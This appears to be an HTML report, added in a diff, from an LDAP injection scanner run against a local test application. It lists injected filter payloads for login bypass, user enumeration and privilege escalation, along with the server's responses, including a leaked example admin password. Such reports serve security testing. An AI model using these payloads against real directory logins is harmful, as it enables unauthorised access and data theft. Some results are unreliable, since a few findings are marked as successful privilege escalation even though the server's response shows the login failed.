@@ -1,0 +1,188 @@
+<!DOCTYPE html><html><head><title>LDAP Report</title>
+<style>
+body { font-family: monospace; background:#111; color:#eee; padding:20px; }
+h1 { color:#ff5555; } h3 { color:#55ff55; border-bottom:1px solid #333; }
+pre { background:#1a1a1a; padding:10px; border-left:3px solid #ff5555; overflow:auto; }
+</style></head><body>
+<h1>LDAP Injection Report</h1>
+<p><b>Target:</b> http://127.0.0.1:5000</p>
+<p><b>Timestamp:</b> 2026-10-15T13:29:08.064777Z</p>
+<p>Confirmed: 15</p>
+<ul><li>detection.basic_auth</li><li>detection.wildcard_pw</li><li>auth_bypass.admin_known_pw</li><li>auth_bypass.wildcard_pw</li><li>auth_bypass.or_always</li><li>auth_bypass.close_and_open</li><li>auth_bypass.null_byte</li><li>auth_bypass.cn_bypass</li><li>data_extraction.all_users</li><li>data_extraction.all_admins</li><li>data_extraction.all_mail</li><li>priv_escalation.force_admin_role</li><li>priv_escalation.admin_via_or</li><li>priv_escalation.role_inject</li><li>filter_bypass.comment</li></ul>
+<h3>detection</h3><pre>{
+  "basic_or": {
+    "confirmed": false,
+    "status": 401,
+    "snippet": "{\"filter\":\"(&(uid=*)(uid=*)(password=x))\",\"message\":\"Invalid credentials\",\"status\":\"fail\"}\n"
+  },
+  "basic_and": {
+    "confirmed": false,
+    "status": 401,
+    "snippet": "{\"filter\":\"(&(uid=*)(&(uid=*)(password=x))\",\"message\":\"Invalid credentials\",\"status\":\"fail\"}\n"
+  },
+  "basic_auth": {
+    "confirmed": true,
+    "status": 200,
+    "snippet": "{\"all_matches\":1,\"filter\":\"(&(uid=admin)(password=*)(uid=*))\",\"message\":\"Logged in as admin (role=admin)\",\"status\":\"ok\",\"user\":{\"cn\":\"Administrator\",\"department\":\"IT\",\"mail\":\"admin@example.com\",\"password\":\"admin123\",\"role\":\"admin\",\"sn\":\"Admin\",\"uid\":\"admin\"}}\n"
+  },
+  "wildcard_pw": {
+    "confirmed": true,
+    "status": 200,
+    "snippet": "{\"all_matches\":1,\"filter\":\"(&(uid=admin)(password=*))\",\"message\":\"Logged in as admin (role=admin)\",\"status\":\"ok\",\"user\":{\"cn\":\"Administrator\",\"department\":\"IT\",\"mail\":\"admin@example.com\",\"password\":\"admin123\",\"role\":\"admin\",\"sn\":\"Admin\",\"uid\":\"admin\"}}\n"
+  },
+  "error_based": {
+    "confirmed": false,
+    "status": 401,
+    "snippet": "{\"filter\":\"(&(uid=*)(invalid)(password=x))\",\"message\":\"Invalid credentials\",\"status\":\"fail\"}\n"
+  }
+}</pre><h3>auth_bypass</h3><pre>{
+  "admin_known_pw": {
+    "bypassed": true,
+    "status": 200,
+    "role": "admin",
+    "snippet": "{\"all_matches\":1,\"filter\":\"(&(uid=admin)(password=admin123))\",\"message\":\"Logged in as admin (role=admin)\",\"status\":\"ok\",\"user\":{\"cn\":\"Administrator\",\"department\":\"IT\",\"mail\":\"admin@example.com\",\"password\":\"admin123\",\"role\":\"admin\",\"sn\":\"Admin\",\"uid\":\"admin\"}}\n"
+  },
+  "wildcard_pw": {
+    "bypassed": true,
+    "status": 200,
+    "role": "admin",
+    "snippet": "{\"all_matches\":1,\"filter\":\"(&(uid=admin)(password=*))\",\"message\":\"Logged in as admin (role=admin)\",\"status\":\"ok\",\"user\":{\"cn\":\"Administrator\",\"department\":\"IT\",\"mail\":\"admin@example.com\",\"password\":\"admin123\",\"role\":\"admin\",\"sn\":\"Admin\",\"uid\":\"admin\"}}\n"
+  },
+  "or_always": {
+    "bypassed": true,
+    "status": 200,
+    "role": "admin",
+    "snippet": "{\"all_matches\":3,\"filter\":\"(&(uid=*)(uid=*))(password=x))\",\"message\":\"Logged in as admin (role=admin)\",\"status\":\"ok\",\"user\":{\"cn\":\"Administrator\",\"department\":\"IT\",\"mail\":\"admin@example.com\",\"password\":\"admin123\",\"role\":\"admin\",\"sn\":\"Admin\",\"uid\":\"admin\"}}\n"
+  },
+  "or_filter": {
+    "bypassed": false,
+    "status": 401,
+    "role": null,
+    "snippet": "{\"filter\":\"(&(uid=*)(|(uid=*))(|(uid=*)(password=x))\",\"message\":\"Invalid credentials\",\"status\":\"fail\"}\n"
+  },
+  "close_and_open": {
+    "bypassed": true,
+    "status": 200,
+    "role": "admin",
+    "snippet": "{\"all_matches\":3,\"filter\":\"(&(uid=*)(uid=*))(|(uid=*)(password=x))\",\"message\":\"Logged in as admin (role=admin)\",\"status\":\"ok\",\"user\":{\"cn\":\"Administrator\",\"department\":\"IT\",\"mail\":\"admin@example.com\",\"password\":\"admin123\",\"role\":\"admin\",\"sn\":\"Admin\",\"uid\":\"admin\"}}\n"
+  },
+  "null_byte": {
+    "bypassed": true,
+    "status": 200,
+    "role": "admin",
+    "snippet": "{\"all_matches\":1,\"filter\":\"(&(uid=admin))%00)(password=x))\",\"message\":\"Logged in as admin (role=admin)\",\"status\":\"ok\",\"user\":{\"cn\":\"Administrator\",\"department\":\"IT\",\"mail\":\"admin@example.com\",\"password\":\"admin123\",\"role\":\"admin\",\"sn\":\"Admin\",\"uid\":\"admin\"}}\n"
+  },
+  "cn_bypass": {
+    "bypassed": true,
+    "status": 200,
+    "role": "admin",
+    "snippet": "{\"all_matches\":3,\"filter\":\"(&(uid=*)(cn=*)(password=*)(cn=*))\",\"message\":\"Logged in as admin (role=admin)\",\"status\":\"ok\",\"user\":{\</pre><h3>data_extraction</h3><pre>{
+  "all_users": {
+    "found": true,
+    "count": 3,
+    "results": [
+      {
+        "cn": "Administrator",
+        "mail": "admin@example.com",
+        "uid": "admin"
+      },
+      {
+        "cn": "Alice Anderson",
+        "mail": "alice@example.com",
+        "uid": "alice"
+      },
+      {
+        "cn": "Bob Brown",
+        "mail": "bob@example.com",
+        "uid": "bob"
+      }
+    ],
+    "login_snippet": "{\"filter\":\"(&(uid=*)(uid=*)(password=x))\",\"message\":\"Invalid credentials\",\"status\":\"fail\"}\n"
+  },
+  "all_admins": {
+    "found": true,
+    "count": 1,
+    "results": [
+      {
+        "cn": "Administrator",
+        "mail": "admin@example.com",
+        "uid": "admin"
+      }
+    ],
+    "login_snippet": "{\"filter\":\"(&(uid=*)(role=admin)(password=x))\",\"message\":\"Invalid credentials\",\"status\":\"fail\"}\n"
+  },
+  "all_mail": {
+    "found": true,
+    "count": 3,
+    "results": [
+      {
+        "cn": "Administrator",
+        "mail": "admin@example.com",
+        "uid": "admin"
+      },
+      {
+        "cn": "Alice Anderson",
+        "mail": "alice@example.com",
+        "uid": "alice"
+      },
+      {
+        "cn": "Bob Brown",
+        "mail": "bob@example.com",
+        "uid": "bob"
+      }
+    ],
+    "login_snippet": "{\"filter\":\"(&(uid=*)(mail=*)(password=x))\",\"message\":\"Invalid credentials\",\"status\":\"fail\"}\n"
+  }
+}</pre><h3>blind_ldap</h3><pre>{
+  "boolean_true": {
+    "bool": false,
+    "snippet": "{\"filter\":\"(&(uid=*)(&(uid=*)(|(uid=*)(password=x))\",\"message\":\"Invalid credentials\",\"status\":\"fail\"}\n"
+  },
+  "boolean_false": {
+    "bool": false,
+    "snippet": "{\"filter\":\"(&(uid=*)(&(uid=*)(|(uid=invalid)(password=x))\",\"message\":\"Invalid credentials\",\"status\":\"fail\"}\n"
+  }
+}</pre><h3>priv_escalation</h3><pre>{
+  "force_admin_role": {
+    "escalated": true,
+    "role": "admin",
+    "snippet": "{\"all_matches\":1,\"filter\":\"(&(uid=*)(uid=*)(role=admin)(password=*))\",\"message\":\"Logged in as admin (role=admin)\",\"status\":\"ok\",\"user\":{\"cn\":\"Administrator\",\"department\":\"IT\",\"mail\":\"admin@example.com\",\"password\":\"admin123\",\"role\":\"admin\",\"sn\":\"Admin\",\"uid\":\"admin\"}}\n"
+  },
+  "admin_via_or": {
+    "escalated": true,
+    "role": null,
+    "snippet": "{\"filter\":\"(&(uid=*)(|(uid=admin))(|(uid=*)(password=*))\",\"message\":\"Invalid credentials\",\"status\":\"fail\"}\n"
+  },
+  "role_inject": {
+    "escalated": true,
+    "role": null,
+    "snippet": "{\"filter\":\"(&(uid=admin)(|(role=admin)(password=x))\",\"message\":\"Invalid credentials\",\"status\":\"fail\"}\n"
+  }
+}</pre><h3>filter_bypass</h3><pre>{
+  "raw": {
+    "payload": "*)(uid=*",
+    "bypassed": false,
+    "snippet": "{\"filter\":\"(&(uid=*)(uid=*)(password=x))\",\"message\":\"Invalid credentials\",\"status\":\"fail\"}\n"
+  },
+  "url_encoded": {
+    "payload": "%2a%29%28%75%69%64%3d%2a",
+    "bypassed": false,
+    "snippet": "{\"filter\":\"(&(uid=%2a%29%28%75%69%64%3d%2a)(password=x))\",\"message\":\"Invalid credentials\",\"status\":\"fail\"}\n"
+  },
+  "double_encoded": {
+    "payload": "%252a%2529%2528%2575%2569%2564%253d%252a",
+    "bypassed": false,
+    "snippet": "{\"filter\":\"(&(uid=%252a%2529%2528%2575%2569%2564%253d%252a)(password=x))\",\"message\":\"Invalid credentials\",\"status\":\"fail\"}\n"
+  },
+  "mixed_case": {
+    "payload": "*)(UID=*",
+    "bypassed": false,
+    "snippet": "{\"filter\":\"(&(uid=*)(UID=*)(password=x))\",\"message\":\"Invalid credentials\",\"status\":\"fail\"}\n"
+  },
+  "comment": {
+    "payload": "*)(uid=*))%00",
+    "bypassed": true,
+    "snippet": "{\"all_matches\":3,\"filter\":\"(&(uid=*)(uid=*))%00)(password=x))\",\"message\":\"Logged in as admin (role=admin)\",\"status\":\"ok\",\"user\":{\"cn\":\"Administrator\",\"department\":\"IT\",\"mail\":\"admin@example.com\",\"pass"
+  }
+}</pre>
+</body></html>
